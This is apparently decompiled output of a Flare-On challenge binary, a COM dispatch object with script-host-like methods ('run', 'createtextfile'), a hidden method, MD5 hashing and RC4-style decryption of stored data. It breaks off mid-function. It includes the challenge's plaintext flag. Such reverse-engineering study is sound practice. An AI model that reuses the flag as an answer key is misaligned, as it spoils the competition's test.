// 40FDA0: using guessed type int dword_40FDA0;
// 40FDA4: using guessed type int dword_40FDA4;

//----- (004019F0) --------------------------------------------------------
int __stdcall query_to_num(int a1, int a2, const wchar_t **a3, unsigned int a4, int a5, _DWORD *a6)
{
  int result; // eax@4

  if ( a3 && a6 && a4 <= 1 )
  {
    result = wcsicmp(*a3, L"createtextfile");
    if ( result )
    {
      result = wcsicmp(*a3, L"gimmethatsweetsweetcrazylove");
      if ( result )
      {
        result = wcsicmp(*a3, L"run");
        if ( result )
        {
          result = wcsicmp(*a3, L"getspecialfolder");
          if ( result )
            result = -2147352570;
          else
            *a6 = 269488144;
        }
        else
        {
          *a6 = -559038737;
        }
      }
      else
      {
        *a6 = 4919;
      }
    }
    else
    {
      *a6 = -889275714;
    }
  }
  else
  {
    result = -2147024809;
  }
  return result;
}

//----- (00401AB0) --------------------------------------------------------
signed int __stdcall sub_401AB0(int a1, int a2, int a3, _DWORD *a4)
{
  if ( !a4 )
    return -2147024809;
  *a4 = 0;
  if ( a2 )
    return -2147352565;
  if ( !a3 )
    goto LABEL_8;
  if ( a3 != 1024 )
  {
    if ( a3 != 2048 )
      return -2147352564;
LABEL_8:
    GetSystemDefaultLCID();
    return -2147352564;
  }
  GetUserDefaultLCID();
  return -2147352564;
}

//----- (00401B10) --------------------------------------------------------
signed int __stdcall sub_401B10(int a1, _DWORD *a2)
{
  signed int result; // eax@2

  if ( a2 )
  {
    *a2 = 1;
    result = 0;
  }
  else
  {
    result = -2147024809;
  }
  return result;
}

//----- (00401B30) --------------------------------------------------------
int __stdcall handle_query(int a1, int a2, int a3, int a4, int a5, DISPPARAMS *pdispparams, VARIANTARG *pvarg, int a8, UINT *puArgErr)
{
  DISPPARAMS *v9; // edi@1
  int result; // eax@2
  _DWORD *v11; // ecx@3
  _DWORD *v12; // edx@3
  unsigned int v13; // esi@3
  bool v14; // cf@5
  VARIANTARG *v15; // ebx@13
  HRESULT v16; // esi@17
  const wchar_t *v17; // ST0C_4@19
  BSTR v18; // eax@22
  VARIANT v19; // [sp+4h] [bp-20h]@13
  VARIANT pvarResult; // [sp+14h] [bp-10h]@10

  v9 = pdispparams;
  if ( !pdispparams )
    return -2147024809;
  v11 = (_DWORD *)a3;
  v12 = &unk_40A3D4;
  v13 = 12;
  do
  {
    if ( *v11 != *v12 )
      return -2147352575;
    ++v11;
    ++v12;
    v14 = v13 < 4;
    v13 -= 4;
  }
  while ( !v14 );
  if ( a2 <= 4919 )
  {
    if ( a2 == 4919 )
      return send_hash_or_encrypted_data((char)pdispparams, a1, 4919, a5, (int)pdispparams, pvarg, puArgErr);
    if ( a2 == -889275714 )
    {
      v15 = pvarg;
      pdispparams = 0;
      pvarResult = 0i64;
      v19 = 0i64;
      if ( !pvarg )
        return 0;
      if ( v9->cArgs != 2 )
        return -2147024809;
      v16 = DispGetParam(v9, 0, 8u, &pvarResult, puArgErr);
      if ( v16 >= 0 )
      {
        v16 = DispGetParam(v9, 1u, 8u, &v19, puArgErr);
        if ( v16 >= 0 )
        {
          VariantInit(v15);
          v17 = pvarResult.bstrVal;
          v15->vt = 8;
          if ( !wcsicmp(v17, L"wimmymebrah") && dword_40F10C )
          {
            sub_402040((int)&unk_40F110, dword_40F10C, v19.bstrVal, (int)&pdispparams);
            v15->lVal = (LONG)pdispparams;
            return v16;
          }
          v18 = SysAllocString(&psz);
          v15->lVal = (LONG)v18;
          if ( !v18 )
            v16 = -2147024882;
        }
      }
      return v16;
    }
    if ( a2 == -559038737 )
    {
      pvarResult = 0i64;
      result = DispGetParam(pdispparams, 0, 0xBu, &pvarResult, puArgErr);
      if ( result < 0 )
        return result;
      if ( -1 == pvarResult.iVal )
      {
        SetErrorMode(2u);
        v0();
        return 0;
      }
      return 0;
    }
    return -2147352573;
  }
  if ( a2 != 269488144 )
    return -2147352573;
  v19 = 0i64;
  result = DispGetParam(pdispparams, 0, 0x17u, &v19, puArgErr);
  if ( result >= 0 )
  {
    Sleep(v19.cyVal.s.Lo);
    return 0;
  }
  return result;
}

//----- (00401D40) --------------------------------------------------------
int __usercall send_hash_or_encrypted_data@<eax>(char a1@<dil>, int a2, int a3, int a4, int a5, VARIANTARG *a6, _DWORD *a7)
      //return send_hash_or_encrypted_data((char)pdispparams, a1, 4919, a5, (int)pdispparams, pvarg, puArgErr);
  // a5 = &&{sz_32bit = 16396, ?, data_ptr (first char is 8))
{
  const OLECHAR *v7; // edi@1
  int result; // eax@4
  int v9; // eax@5
  const WCHAR *v10; // esi@6
  CHAR *v11; // eax@9
  int v12; // esi@11
  const CHAR *v13; // ebx@12
  char *v14; // edi@14
  signed int v15; // esi@14
  int v16; // eax@18
  WCHAR *v17; // eax@18
  BSTR v18; // eax@21
  char v19; // [sp-Ch] [bp-138h]@1
  CHAR *Memory; // [sp+0h] [bp-12Ch]@9
  int cchWideChar; // [sp+8h] [bp-124h]@18
  CHAR *v22; // [sp+Ch] [bp-120h]@1
  size_t Size; // [sp+10h] [bp-11Ch]@1
  char Dst; // [sp+14h] [bp-118h]@1
  BYTE pbData[16]; // [sp+118h] [bp-14h]@1

  v19 = a1;
  v7 = 0;
  Size = 0;
  *(_OWORD *)pbData = 0i64;
  v22 = 0;
  memset(&Dst, 0, 0x102u);
  if ( *(_DWORD *)(a5 + 8) != 1 )
    return -2147024809;
  if ( 16396 != **(_WORD **)a5 || (v9 = *(_DWORD *)(*(_DWORD *)a5 + 8), 8 != *(_WORD *)v9) )
  {
    *a7 = 0;
    return -2147024809;
  }
  v10 = *(const WCHAR **)(v9 + 8);
  result = hash_something(*(LPCWSTR *)(v9 + 8), 0, (int)&Size, 0);
  if ( result != -2147024774 )
    return result;
  if ( !Size )
    return -2147467259;
  v11 = (CHAR *)malloc(Size);
  Memory = v11;
  if ( !v11 )
    return -2147024882;
  v12 = hash_something(v10, v11, (int)&Size, pbData);
  if ( v12 >= 0 )
  {
    v13 = (const CHAR *)malloc(cbMultiByte);
    v22 = (CHAR *)v13;
    if ( v13 )
    {
      generate_perm((int)&Dst, (int)pbData, 16);
      mix_arg1_arg2((int)&Dst, (int)&unk_40CD28, (int)v13, cbMultiByte);
      v14 = (char *)pbData;
      v15 = 16;
      do
      {
        --v15;
        send_printfed_data((int)"%02x ", *v14++);
        if ( !(v15 & 0xF) )
          send_printfed_data((int)"\n", v19);
      }
      while ( v15 );
      v16 = MultiByteToWideChar(0, 0, v13, cbMultiByte, 0, 0);
      cchWideChar = v16;
      v17 = (WCHAR *)malloc(2 * v16 + 2);
      v7 = v17;
      if ( v17 )
      {
        v17[MultiByteToWideChar(0, 0, v13, cbMultiByte, v17, cchWideChar)] = 0;
        if ( a6 )
        {
          VariantInit(a6);
          v18 = SysAllocString(v7);
          a6->lVal = (LONG)v18;
          if ( !v18 )
          {
            v12 = -2147024882;
            goto LABEL_25;
          }
          a6->vt = 8;
        }
        v12 = 0;
        goto LABEL_25;
      }
      v12 = -2147024882;
    }
    else
    {
      v12 = -2147024882;
    }
  }
LABEL_25:
  free(Memory);
  if ( v22 )
    free(v22);
  if ( v7 )
    free((void *)v7);
  return v12;
}
// 401D40: could not find valid save-restore pair for edi

//----- (00401FA0) --------------------------------------------------------
signed int __stdcall retrieve_some_data(int a1, _DWORD *a2, _DWORD *a3)
{
  signed int result; // eax@2
  _DWORD *v4; // edx@3
  _DWORD *v5; // ecx@3
  _DWORD *v6; // esi@3
  unsigned int v7; // edi@3
  bool v8; // cf@5
  _DWORD *v9; // ecx@7
  unsigned int v10; // esi@7

  if ( a3 )
  {
    v4 = a2;
    v5 = a2;
    *a3 = 0;
    v6 = &unk_40A3C4;
    v7 = 12;
    while ( *v5 == *v6 )
    {
      ++v5;
      ++v6;
      v8 = v7 < 4;
      v7 -= 4;
      if ( v8 )
      {
LABEL_10:
        *a3 = &dword_40FD88;
        _InterlockedIncrement((volatile signed __int32 *)&dword_40FDA8);
        return 0;
      }
    }
    v9 = &unk_40A3E4;
    v10 = 12;
    while ( *v4 == *v9 )
    {
      ++v4;
      ++v9;
      v8 = v10 < 4;
      v10 -= 4;
      if ( v8 )
        goto LABEL_10;
    }
    result = -2147467262;
  }
  else
  {
    result = -2147024809;
  }
  return result;
}
// 40FD88: using guessed type int dword_40FD88;
// 40FDA8: using guessed type int dword_40FDA8;

//----- (00402040) --------------------------------------------------------
int __cdecl sub_402040(int a1, int a2, LPCWSTR lpWideCharStr, int a4)
{
  const OLECHAR *v4; // edi@1
  int v5; // eax@1
  int v6; // esi@1
  int result; // eax@2
  CHAR *v8; // eax@3
  void (__cdecl *v9)(void *); // ebx@5
  signed int v10; // esi@6
  const CHAR *v11; // ebx@7
  int v12; // esi@9
  WCHAR *v13; // eax@11
  BSTR v14; // eax@15
  CHAR *v15; // ST1C_4@17
  int v16; // [sp+14h] [bp-114h]@5
  CHAR *Memory; // [sp+1Ch] [bp-10Ch]@3
  char Dst; // [sp+20h] [bp-108h]@1

  memset(&Dst, 0, 0x102u);
  v4 = 0;
  v5 = WideCharToMultiByte(0, 0, lpWideCharStr, -1, 0, 0, 0, 0);
  v6 = v5;
  if ( v5 )
  {
    v8 = (CHAR *)malloc(v5);
    Memory = v8;
    if ( v8 )
    {
      v9 = free;
      v16 = WideCharToMultiByte(0, 0, lpWideCharStr, -1, v8, v6, 0, 0);
      if ( v16 )
      {
        v11 = (const CHAR *)calloc(1u, a2 + 1);
        if ( v11 )
        {
          generate_perm((int)&Dst, (int)Memory, v16 - 1);
          mix_arg1_arg2((int)&Dst, a1, (int)v11, a2);
          v12 = MultiByteToWideChar(0, 0, v11, -1, 0, 0);
          if ( v12 )
          {
            v13 = (WCHAR *)malloc(2 * v12);
            v4 = v13;
            if ( v13 )
            {
              if ( MultiByteToWideChar(0, 0, v11, -1, v13, v12) )
              {
                v14 = SysAllocString(v4);
                v10 = 0;
                *(_DWORD *)a4 = v14;
                if ( !v14 )
                  v10 = -2147024882;
              }
              else
              {
                v10 = -2147467259;
              }
            }
            else
            {
              v10 = -2147024882;
            }
          }
          else
          {
            v10 = -2147467259;
          }
          v15 = (CHAR *)v11;
          v9 = free;
          free(v15);
        }
        else
        {
          v9 = free;
          v10 = -2147024882;
        }
      }
      else
      {
        v10 = -2147467259;
      }
      v9(Memory);
      if ( v4 )
        v9((void *)v4);
      result = v10;
    }
    else
    {
      result = -2147024882;
    }
  }
  else
  {
    result = -2147467259;
  }
  return result;
}

//----- (00402210) --------------------------------------------------------
int __cdecl hash_something(LPCWSTR lpWideCharStr, LPSTR lpMultiByteStr, int a3, BYTE *pbData)
{
  unsigned int *v4; // ebx@2
  LPSTR v5; // edi@3
  int v6; // eax@5
  DWORD v7; // eax@6
  int result; // eax@8
  unsigned int v9; // edx@11
  DWORD v10; // esi@13
  _BYTE *v11; // ecx@14
  char v12; // al@15
  BYTE v13; // al@17
  LPSTR v14; // edx@17
  BYTE *v15; // ecx@17
  BYTE *v16; // ebx@25
  DWORD pdwDataLen; // [sp+8h] [bp-8h]@26
  HCRYPTPROV phProv; // [sp+Ch] [bp-4h]@26

  if ( !lpWideCharStr )
    return -2147024809;
  v4 = (unsigned int *)a3;
  if ( !a3 )
    return -2147024809;
  v5 = lpMultiByteStr;
  if ( *(_DWORD *)a3 )
  {
    if ( !lpMultiByteStr )
      return -2147024809;
  }
  v6 = WideCharToMultiByte(0, 0, lpWideCharStr, -1, lpMultiByteStr, *(_DWORD *)a3, 0, 0);
  if ( !v6 )
  {
    v7 = GetLastError();
    if ( v7 != 87 )
    {
      if ( v7 == 122 )
        return -2147024774;
      return -2147467259;
    }
    return -2147024809;
  }
  if ( v6 < 0 )
    return -2147467259;
  v9 = *v4;
  if ( *v4 )
  {
    v10 = 0;
    if ( !v5 )
      goto LABEL_35;
    v11 = v5;
    lpWideCharStr = (LPCWSTR)(v5 + 1);
    do
      v12 = *v11++;
    while ( v12 );
    if ( v11 - (_BYTE *)lpWideCharStr <= v9 )
    {
      v13 = *v5;
      v14 = v5;
      v15 = (BYTE *)v5;
      if ( *v5 )
      {
        do
        {
          if ( v13 != 32 && v13 != 39 && v13 != 10 && v13 != 13 && v13 != 9 )
          {
            *v15++ = v13;
            ++v10;
          }
          v13 = (v14++)[1];
        }
        while ( v13 );
      }
      *v4 = v10;
      v16 = pbData;
      if ( pbData )
      {
        phProv = 0;
        lpWideCharStr = 0;
        pdwDataLen = 16;
        if ( CryptAcquireContextA(&phProv, 0, 0, 0x18u, 0x40u) )
        {
            // md5
          if ( CryptCreateHash(phProv, 0x8003u, 0, 0, (HCRYPTHASH *)&lpWideCharStr) )
          {
            if ( CryptHashData((HCRYPTHASH)lpWideCharStr, (const BYTE *)v5, v10, 0) )
              CryptGetHashParam((HCRYPTHASH)lpWideCharStr, 2u, v16, &pdwDataLen, 0);
          }
        }
      }
      result = 0;
    }
    else
    {
LABEL_35:
      result = -2147024809;
    }
  }
  else
  {
    *v4 = v6;
    result = -2147024774;
  }
  return result;
}

//----- (00402380) --------------------------------------------------------
void __cdecl mix_arg1_arg2(int a1, int a2, int a3, int a4)
{
  int v4; // ebx@2
  int v5; // edi@3
  int v6; // esi@3
  char v7; // dl@3
  bool v8; // zf@3
  int v9; // [sp+Ch] [bp+Ch]@2

  if ( a4 > 0 )
  {
    v4 = a3;
    v9 = a2 - a3;
    do
    {
      ++*(_BYTE *)(a1 + 256);
      ++v4;
      v5 = *(_BYTE *)(a1 + 256);
      *(_BYTE *)(a1 + 257) += *(_BYTE *)(v5 + a1);
      v6 = *(_BYTE *)(a1 + 257);
      v7 = *(_BYTE *)(v5 + a1);
      *(_BYTE *)(v5 + a1) = *(_BYTE *)(v6 + a1);
      *(_BYTE *)(v6 + a1) = v7;
      v8 = a4-- == 1;
      *(_BYTE *)(v4 - 1) = *(_BYTE *)(v9 + v4 - 1) ^ *(_BYTE *)((unsigned __int8)(*(_BYTE *)(*(_BYTE *)(a1 + 257) + a1)
                                                                                + *(_BYTE *)(*(_BYTE *)(a1 + 256) + a1))
                                                              + a1);
    }
    while ( !v8 );
  }
}

scr1pt1ng_sl4ck1ng_and_h4ck1ng@flare-on.com
//----- (00402400) --------------------------------------------------------
int __cdecl generate_perm(int ptr1, int ptr2, signed int ptr2len)
{
  signed int v3; // eax@1
  signed int v4; // edi@3
  unsigned __int8 v5; // bh@3
  char v6; // bl@4
  int result; // eax@4

  v3 = 0;
  do
  {
    *(_BYTE *)(v3 + ptr1) = v3;
    ++v3;
  }
  while ( v3 < 256 );
  // ptr1[i] = i

  v4 = 0;
  *(_WORD *)(ptr1 + 256) = 0;
  v5 = 0;
  do
  {
    v6 = *(_BYTE *)(v4 + ptr1);
    //v6 = ptr[i]
    v5 += v6 + *(_BYTE *)(v4 % ptr2len+ ptr2);
    // csum(v5, 8bit) += ptr[i] + ptr2[i^
    result = *(_BYTE *)(v5 + ptr1);
    *(_BYTE *)(v4++ + ptr1) = result;
    *(_BYTE *)(v5 + ptr1) = v6;
    //swap ptr[i], ptr[csum]
  }
  while ( v4 < 256 );
  return result;
}

//----- (00402457) --------------------------------------------------------
#error "40245D: can not convert to microcode (funcsize=2)"

//----- (00402468) --------------------------------------------------------
int __usercall sub_402468@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // ST0C_4@1
  int v4; // eax@1
  int *v5; // esi@1
  int v6; // esi@1
  signed int v7; // eax@2
  int v8; // eax@5

  v3 = a3;
  set_app_type(2);
  v4 = sub_402ADE();
  set_fmode(v4);
  v5 = (int *)_p__commode();
  *v5 = sub_402AD7();
  v6 = v3;
  if ( !sub_402874(a1, a2, 1) )
    goto LABEL_12;
  __asm { fnclex }
  sub_402D37();
  sub_402A28((int)sub_402D63);
  v7 = sub_402ADA();
  if ( configure_narrow_argv(v7) )
  {
LABEL_12:
    sub_402B50(a1, a2, v6, 7u);
    __debugbreak();
    JUMPOUT(*(_DWORD *)sub_40250C);
  }
  sub_402AE4();
  if ( sub_402B38() )
    _setusermatherr(sub_402AD7);
  nullsub_1();
  nullsub_1();
  sub_402AF3(a1, a2, v6);
  v8 = sub_402AD7();
  configthreadlocale(v8);
  if ( sub_402AF0() )
    initialize_narrow_environment();
  sub_402AD7();
  return 0;
}
// 402468: could not find valid save-restore pair for esi
// 40250C: using guessed type int sub_40250C();
// 402B14: using guessed type int nullsub_1(void);
// 402FD1: using guessed type int __cdecl set_app_type(_DWORD);
// 402FD7: using guessed type int __cdecl _setusermatherr(_DWORD);
// 402FDD: using guessed type int __cdecl configure_narrow_argv(_DWORD);
// 402FE3: using guessed type int initialize_narrow_environment(void);
// 403022: using guessed type int __cdecl configthreadlocale(_DWORD);
// 40302E: using guessed type int _p__commode(void);

//----- (0040250C) --------------------------------------------------------
int sub_40250C()
{
  sub_402B1B();
  return 0;
}
// 40250C: using guessed type int sub_40250C();

//----- (00402514) --------------------------------------------------------
int sub_402514()
{
  int v0; // eax@1

  sub_402CE2();
  v0 = sub_402AD7();
  return set_new_mode(v0);
}
// 403028: using guessed type int __cdecl set_new_mode(_DWORD);

//----- (00402647) --------------------------------------------------------
int __usercall sub_402647@<eax>(int a1@<ebp>)
{
  int **v1; // ecx@1
  int v2; // eax@1

  v1 = *(int ***)(a1 - 20);
  v2 = **v1;
  *(_DWORD *)(a1 - 32) = v2;
  return seh_filter_exe(v2, v1);
}
// 402FCB: using guessed type int __cdecl seh_filter_exe(_DWORD, _DWORD);

//----- (0040265B) --------------------------------------------------------
void __usercall sub_40265B(int a1@<ebp>)
{
  if ( sub_402C9F() )
  {
    if ( !*(_BYTE *)(a1 - 25) )
      c_exit();
    *(_DWORD *)(a1 - 4) = -2;
    JUMPOUT(loc_40267C);
  }
  exit(*(_DWORD *)(a1 - 32));
}
// 403016: using guessed type int c_exit(void);

//----- (004026A2) --------------------------------------------------------
BOOL __cdecl sub_4026A2(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  HANDLE v1; // eax@1

  SetUnhandledExceptionFilter(0);
  UnhandledExceptionFilter(ExceptionInfo);
  v1 = GetCurrentProcess();
  return TerminateProcess(v1, 0xC0000409);
}

//----- (004026CA) --------------------------------------------------------
int __usercall sub_4026CA@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, char a4)
{
  int v4; // edx@1
  int v5; // ecx@1
  unsigned int v6; // et0@3
  int vars0; // [sp+324h] [bp+0h]@0
  int retaddr; // [sp+328h] [bp+4h]@3

  if ( IsProcessorFeaturePresent(0x17u) )
    __fastfail(2u);
  dword_40FEB0 = 0;
  dword_40FEAC = v5;
  dword_40FEA8 = v4;
  dword_40FEA4 = a1;
  dword_40FEA0 = a3;
  dword_40FE9C = a2;
  word_40FEC8 = __SS__;
  word_40FEBC = __CS__;
  word_40FE98 = __DS__;
  word_40FE94 = __ES__;
  word_40FE90 = __FS__;
  word_40FE8C = __GS__;
  v6 = __readeflags();
  dword_40FEC0 = v6;
  dword_40FEB4 = vars0;
  dword_40FEB8 = retaddr;
  dword_40FEC4 = (int)&a4;
  dword_40FE00 = 65537;
  dword_40FDBC = retaddr;
  dword_40FDB0 = -1073740791;
  dword_40FDB4 = 1;
  dword_40FDC0 = 1;
  dword_40FDC4 = 2;
  return sub_4026A2(&ExceptionInfo);
}
// 40FDB0: using guessed type int dword_40FDB0;
// 40FDB4: using guessed type int dword_40FDB4;
// 40FDBC: using guessed type int dword_40FDBC;
// 40FDC0: using guessed type int dword_40FDC0;
// 40FDC4: using guessed type int dword_40FDC4;
// 40FE00: using guessed type int dword_40FE00;
// 40FE8C: using guessed type __int16 word_40FE8C;
// 40FE90: using guessed type __int16 word_40FE90;
// 40FE94: using guessed type __int16 word_40FE94;
// 40FE98: using guessed type __int16 word_40FE98;
// 40FE9C: using guessed type int dword_40FE9C;
// 40FEA0: using guessed type int dword_40FEA0;
// 40FEA4: using guessed type int dword_40FEA4;
// 40FEA8: using guessed type int dword_40FEA8;
// 40FEAC: using guessed type int dword_40FEAC;
// 40FEB0: using guessed type int dword_40FEB0;
// 40FEB4: using guessed type int dword_40FEB4;
// 40FEB8: using guessed type int dword_40FEB8;
// 40FEBC: using guessed type __int16 word_40FEBC;
// 40FEC0: using guessed type int dword_40FEC0;
// 40FEC4: using guessed type int dword_40FEC4;
// 40FEC8: using guessed type __int16 word_40FEC8;

//----- (004027C5) --------------------------------------------------------
int __cdecl sub_4027C5(int a1, unsigned int a2)
{
  int v2; // ecx@1
  int v3; // edx@1
  int v4; // esi@1
  int result; // eax@5

  v2 = a1 + *(_DWORD *)(a1 + 60);
  v3 = *(_WORD *)(v2 + 20) + v2 + 24;
  v4 = v3 + 40 * *(_WORD *)(v2 + 6);
  if ( v3 == v4 )
  {
LABEL_5:
    result = 0;
  }
  else
  {
    while ( a2 < *(_DWORD *)(v3 + 12) || a2 >= *(_DWORD *)(v3 + 12) + *(_DWORD *)(v3 + 8) )
    {
      v3 += 40;
      if ( v3 == v4 )
        goto LABEL_5;
    }
    result = v3;
  }
  return result;
}

//----- (00402809) --------------------------------------------------------
char sub_402809()
{
  signed __int32 v0; // edx@2
  signed __int32 v1; // eax@4

  if ( sub_402FA7() )
  {
    v0 = *(_DWORD *)(__readfsdword(24) + 4);
    while ( 1 )
    {
      v1 = _InterlockedCompareExchange((volatile signed __int32 *)&unk_4100EC, v0, 0);
      if ( !v1 )
        break;
      if ( v0 == v1 )
        return 1;
    }
  }
  return 0;
}

//----- (0040283B) --------------------------------------------------------
char __cdecl sub_40283B(int a1)
{
  if ( !a1 )
    byte_4100F0 = 1;
  sub_402E0E();
  if ( !sub_402AF0() )
    return 0;
  if ( !sub_402AF0() )
  {
    sub_402AF0();
    return 0;
  }
  return 1;
}
// 4100F0: using guessed type char byte_4100F0;

//----- (00402874) --------------------------------------------------------
char __usercall sub_402874@<al>(int a1@<ebx>, int a2@<edi>, int a3)
{
  int v4; // eax@10
  int v5; // eax@10

  if ( byte_4100E4 )
    return 1;
  if ( a3 && a3 != 1 )
  {
    sub_402B50(a1, a2, a3, 5u);
    __debugbreak();
    JUMPOUT(*(_DWORD *)sub_40291E);
  }
  if ( !sub_402FA7() || a3 )
  {
    v4 = __ROR4__(-1, 32 - (__security_cookie & 0x1F));
    v5 = __security_cookie ^ v4;
    dword_4100CC = v5;
    *(&dword_4100CC + 1) = v5;
    *(&dword_4100CC + 2) = v5;
    dword_4100D8[0] = v5;
    dword_4100D8[1] = v5;
    dword_4100D8[2] = v5;
  }
  else if ( initialize_onexit_table(&dword_4100CC) || initialize_onexit_table(dword_4100D8) )
  {
    return 0;
  }
  byte_4100E4 = 1;
  return 1;
}
// 403034: using guessed type int __cdecl initialize_onexit_table(_DWORD);
// 4100CC: using guessed type int dword_4100CC;
// 4100E4: using guessed type char byte_4100E4;

//----- (0040291E) --------------------------------------------------------
int __usercall sub_40291E@<eax>(int a1@<ebp>)
{
  int v1; // eax@4

  sub_402D90((int)&unk_40A720, 8);
  *(_DWORD *)(a1 - 4) = 0;
  if ( v400000 == 23117
    && *(_DWORD *)(v40003C + 0x400000) == 17744
    && *(_WORD *)(v40003C + 4194328) == 267
    && (v1 = sub_4027C5(0x400000, *(_DWORD *)(a1 + 8) - 0x400000)) != 0
    && *(_DWORD *)(v1 + 36) >= 0 )
  {
    *(_DWORD *)(a1 - 4) = -2;
  }
  else
  {
    *(_DWORD *)(a1 - 4) = -2;
  }
  return sub_402DD6();
}
// 402DD6: using guessed type int sub_402DD6(void);

//----- (004029A8) --------------------------------------------------------
signed __int32 __cdecl sub_4029A8(char a1)
{
  signed __int32 result; // eax@1

  result = sub_402FA7();
  if ( result )
  {
    if ( !a1 )
      result = _InterlockedExchange((volatile signed __int32 *)&unk_4100EC, 0);
  }
  return result;
}

//----- (004029C5) --------------------------------------------------------
char __cdecl sub_4029C5(int a1, char a2)
{
  if ( !byte_4100F0 || !a2 )
  {
    sub_402AF0();
    sub_402AF0();
  }
  return 1;
}
// 4100F0: using guessed type char byte_4100F0;

//----- (004029ED) --------------------------------------------------------
int __cdecl sub_4029ED(int a1)
{
  int v1; // eax@1
  int v2; // eax@2

  v1 = __ROR4__(dword_4100CC ^ __security_cookie, __security_cookie & 0x1F);
  if ( v1 == -1 )
    v2 = crt_atexit(a1);
  else
    v2 = register_onexit_function(&dword_4100CC);
  return v2 == 0 ? a1 : 0;
}
// 40303A: using guessed type int __cdecl register_onexit_function(_DWORD);
// 403040: using guessed type int __cdecl crt_atexit(_DWORD);
// 4100CC: using guessed type int dword_4100CC;

//----- (00402A28) --------------------------------------------------------
int __cdecl sub_402A28(int a1)
{
  return (sub_4029ED(a1) != 0) - 1;
}

//----- (00402A3D) --------------------------------------------------------
DWORD sub_402A3D()
{
  LARGE_INTEGER PerformanceCount; // [sp+0h] [bp-14h]@1
  struct _FILETIME SystemTimeAsFileTime; // [sp+8h] [bp-Ch]@1
  DWORD v3; // [sp+10h] [bp-4h]@1

  SystemTimeAsFileTime.dwLowDateTime = 0;
  SystemTimeAsFileTime.dwHighDateTime = 0;
  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
  v3 = SystemTimeAsFileTime.dwLowDateTime ^ SystemTimeAsFileTime.dwHighDateTime;
  v3 ^= GetCurrentThreadId();
  v3 ^= GetCurrentProcessId();
  QueryPerformanceCounter(&PerformanceCount);
  return (unsigned int)&v3 ^ v3 ^ PerformanceCount.s.LowPart ^ PerformanceCount.s.HighPart;
}

//----- (00402A8C) --------------------------------------------------------
void sub_402A8C()
{
  int v0; // ecx@1
  DWORD v1; // eax@3

  v0 = __security_cookie;
  if ( __security_cookie == -1153374642 || !(__security_cookie & 0xFFFF0000) )
  {
    v1 = sub_402A3D();
    v0 = v1;
    if ( v1 == -1153374642 )
    {
      v0 = -1153374641;
    }
    else if ( !(v1 & 0xFFFF0000) )
    {
      v0 = ((v1 | 0x4711) << 16) | v1;
    }
    __security_cookie = v0;
  }
  dword_40FD64 = ~v0;
}
// 40FD64: using guessed type int dword_40FD64;

//----- (00402AD7) --------------------------------------------------------
int sub_402AD7()
{
  return 0;
}

//----- (00402ADA) --------------------------------------------------------
signed int sub_402ADA()
{
  return 1;
}

//----- (00402ADE) --------------------------------------------------------
signed int sub_402ADE()
{
  return 0x4000;
}

//----- (00402AE4) --------------------------------------------------------
void sub_402AE4()
{
  InitializeSListHead(&ListHead);
}

//----- (00402AF0) --------------------------------------------------------
char sub_402AF0()
{
  return 1;
}

//----- (00402AF3) --------------------------------------------------------
errno_t __usercall sub_402AF3@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  errno_t result; // eax@1

  result = controlfp_s(0, 0x10000u, 0x30000u);
  if ( result )
  {
    sub_402B50(a1, a2, a3, 7u);
    __debugbreak();
    JUMPOUT(*(_DWORD *)nullsub_1);
  }
  return result;
}
// 402B14: using guessed type int nullsub_1(void);

//----- (00402B15) --------------------------------------------------------
void *sub_402B15()
{
  return &unk_410100;
}

//----- (00402B1B) --------------------------------------------------------
_DWORD *sub_402B1B()
{
  _DWORD *v0; // eax@1
  int v1; // ecx@1
  _DWORD *result; // eax@1
  int v3; // ecx@1

  v0 = sub_401220();
  v1 = v0[1];
  *v0 |= 4u;
  v0[1] = v1;
  result = sub_402B15();
  v3 = result[1];
  *result |= 2u;
  result[1] = v3;
  return result;
}

//----- (00402B38) --------------------------------------------------------
BOOL sub_402B38()
{
  return dword_40FD6C == 0;
}
// 40FD6C: using guessed type int dword_40FD6C;

//----- (00402B44) --------------------------------------------------------
void *sub_402B44()
{
  return &unk_41014C;
}

//----- (00402B4A) --------------------------------------------------------
void *sub_402B4A()
{
  return &unk_410148;
}

//----- (00402B50) --------------------------------------------------------
void __usercall sub_402B50(int a1@<ebx>, int a2@<edi>, int a3@<esi>, unsigned int a4)
{
  void *v4; // eax@3
  int v5; // ecx@3
  int v6; // edx@3
  unsigned int v7; // et0@3
  BOOL v8; // eax@3
  bool v9; // bl@3
  int Dst; // [sp+8h] [bp-324h]@3
  __int16 v11; // [sp+94h] [bp-298h]@3
  __int16 v12; // [sp+98h] [bp-294h]@3
  __int16 v13; // [sp+9Ch] [bp-290h]@3
  __int16 v14; // [sp+A0h] [bp-28Ch]@3
  int v15; // [sp+A4h] [bp-288h]@3
  int v16; // [sp+A8h] [bp-284h]@3
  int v17; // [sp+ACh] [bp-280h]@3
  int v18; // [sp+B0h] [bp-27Ch]@3
  int v19; // [sp+B4h] [bp-278h]@3
  void *v20; // [sp+B8h] [bp-274h]@3
  int v21; // [sp+BCh] [bp-270h]@3
  int v22; // [sp+C0h] [bp-26Ch]@3
  __int16 v23; // [sp+C4h] [bp-268h]@3
  unsigned int v24; // [sp+C8h] [bp-264h]@3
  void **v25; // [sp+CCh] [bp-260h]@3
  __int16 v26; // [sp+D0h] [bp-25Ch]@3
  int v27; // [sp+2D4h] [bp-58h]@3
  int v28; // [sp+2D8h] [bp-54h]@3
  int v29; // [sp+2E0h] [bp-4Ch]@3
  struct _EXCEPTION_POINTERS ExceptionInfo; // [sp+324h] [bp-8h]@3
  int savedregs; // [sp+32Ch] [bp+0h]@3
  int retaddr; // [sp+330h] [bp+4h]@3

  if ( IsProcessorFeaturePresent(0x17u) )
    __fastfail(a4);
  sub_402D2F();
  v4 = memset(&Dst, 0, 0x2CCu);
  v20 = v4;
  v19 = v5;
  v18 = v6;
  v17 = a1;
  v16 = a3;
  v15 = a2;
  v26 = __SS__;
  v23 = __CS__;
  v14 = __DS__;
  v13 = __ES__;
  v12 = __FS__;
  v11 = __GS__;
  v7 = __readeflags();
  v24 = v7;
  v22 = retaddr;
  v25 = (void **)&retaddr;
  Dst = 65537;
  v21 = savedregs;
  memset(&v27, 0, 0x50u);
  v27 = 1073741845;
  v28 = 1;
  v29 = retaddr;
  v8 = IsDebuggerPresent();
